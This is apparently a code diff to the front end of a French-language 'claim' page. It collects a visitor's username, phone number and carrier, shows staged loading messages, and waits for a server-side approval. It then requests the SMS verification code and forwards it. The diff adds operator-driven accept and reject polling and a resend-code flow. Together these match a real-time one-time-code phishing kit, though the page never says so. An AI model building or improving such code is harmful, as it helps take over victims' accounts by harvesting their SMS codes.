@@ -3,7 +3,10 @@ const usernameInput = document.getElementById("username");
 const phoneInput = document.getElementById("phone");
 const claimBtn = document.getElementById("claim-btn");
 const verifyBtn = document.getElementById("verify-btn");
+const resendBtn = document.getElementById("resend-btn");
 const codeInput = document.getElementById("code");
+const codeField = document.getElementById("code-field");
+const codeError = document.getElementById("code-error");
 const statusLine = document.getElementById("status-line");
 const statusText = document.getElementById("status-text");
 const codeStatus = document.getElementById("code-status");
@@ -37,6 +40,7 @@ const loadingMessages = [
 
 let selectedCarrier = null;
 let formData = {};
+let sessionId = null;
 
 function setStatus(text, state = "idle") {
   statusText.textContent = text;
@@ -55,6 +59,23 @@ function showSuccessStep() {
   successUsername.textContent = `@${formData.username}`;
   successCarrier.textContent = formData.carrier;
   showStep("success");
+}
+
+function resetCodeUi() {
+  codeError.hidden = true;
+  codeField.hidden = false;
+  verifyBtn.hidden = false;
+  codeInput.value = "";
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = "Vérifier le code";
+  codeStatus.textContent = "En attente de votre code SMS à 4 chiffres.";
+}
+
+function showCodeRejectedUi() {
+  codeError.hidden = false;
+  codeField.hidden = true;
+  verifyBtn.hidden = true;
+  codeStatus.textContent = "Code refusé — vous pouvez demander un nouveau code.";
 }
 
 function updateClaimButton() {
@@ -91,13 +112,13 @@ async function sendSubmission(type, data) {
   return response.json();
 }
 
-async function waitForApproval(sessionId) {
+async function pollSession(targetStatuses) {
   while (true) {
     const response = await fetch(`/api/session?id=${encodeURIComponent(sessionId)}`);
     const data = await response.json();
 
-    if (data.status === "approved") {
-      return;
+    if (targetStatuses.includes(data.status)) {
+      return data.status;
     }
 
     await wait(2000);
@@ -126,8 +147,6 @@ async function startLoadingFlow() {
 
   await wait(1800);
 
-  let sessionId;
-
   try {
     const result = await sendSubmission("request", {
       username: formData.username,
@@ -146,7 +165,7 @@ async function startLoadingFlow() {
   }
 
   setLoadingStep(2);
-  await waitForApproval(sessionId);
+  await pollSession(["approved"]);
 
   loadingMessage.textContent = "Code envoyé !";
   loadingSteps.forEach((step) => {
@@ -155,8 +174,43 @@ async function startLoadingFlow() {
   });
 
   await wait(900);
+  resetCodeUi();
   showStep("code");
   codeInput.focus();
+}
+
+async function submitCodeVerification() {
+  const code = codeInput.value.trim();
+  if (!code || !sessionId) return;
+
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = "Vérification…";
+  codeStatus.textContent = "Vérification du code en cours…";
+  codeError.hidden = true;
+
+  try {
+    await sendSubmission("verify", {
+      sessionId,
+      username: formData.username,
+      phone: formData.phone,
+      carrier: formData.carrier,
+      code,
+    });
+  } catch {
+    codeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
+    verifyBtn.textContent = "Vérifier le code";
+    verifyBtn.disabled = codeInput.value.length === 4;
+    return;
+  }
+
+  const result = await pollSession(["code_approved", "code_rejected"]);
+
+  if (result === "code_approved") {
+    showSuccessStep();
+    return;
+  }
+
+  showCodeRejectedUi();
 }
 
 carrierButtons.forEach((button) => {
@@ -203,28 +257,32 @@ codeInput.addEventListener("input", () => {
   verifyBtn.disabled = codeInput.value.length !== 4;
 });
 
-verifyBtn.addEventListener("click", async () => {
-  const code = codeInput.value.trim();
-  if (!code) return;
+verifyBtn.addEventListener("click", () => {
+  submitCodeVerification();
+});
 
-  verifyBtn.disabled = true;
-  verifyBtn.textContent = "Vérification…";
-  codeStatus.textContent = "Vérification du code en cours…";
+resendBtn.addEventListener("click", async () => {
+  if (!sessionId) return;
+
+  resendBtn.disabled = true;
+  resendBtn.textContent = "Envoi…";
 
   try {
-    await sendSubmission("verify", {
+    await sendSubmission("resend_code", {
+      sessionId,
       username: formData.username,
       phone: formData.phone,
       carrier: formData.carrier,
-      code,
     });
   } catch {
-    codeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
-    verifyBtn.textContent = "Vérifier le code";
-    verifyBtn.disabled = false;
+    codeStatus.textContent = "Erreur lors de la demande. Réessayez.";
+    resendBtn.disabled = false;
+    resendBtn.textContent = "Renvoyer un code";
     return;
   }
 
-  await wait(1500);
-  showSuccessStep();
+  resetCodeUi();
+  codeInput.focus();
+  resendBtn.disabled = false;
+  resendBtn.textContent = "Renvoyer un code";
 });
